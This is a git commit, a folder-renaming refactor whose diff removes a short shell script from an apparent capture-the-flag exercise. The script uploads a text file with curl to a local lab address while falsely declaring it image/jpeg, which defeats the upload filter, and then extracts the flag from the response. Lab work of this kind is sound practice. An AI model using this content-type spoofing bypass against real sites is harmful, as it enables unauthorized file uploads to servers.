11dfcead50ccbf32f96cd9f3f6c32fcb8f3b4d8b
Drew Finnis <drewfinnis@gmail.com>
2021-03-23 15:42:40 +0100

    refacto/folder name to lower case

--- FILE_UPLOAD/find_flag.sh
+++
@@ -1,9 +0,0 @@
-touch inject.txt
-curl -s --form "Upload=send" \
---header "Content-Type: multipart/form-data" \
---form "uploaded=@inject.txt;type=image/jpeg" \
-http://192.168.0.15/?page\=upload \
-| grep flag \
-| head -c 120 | tail -c 78
-echo
-rm inject.txt
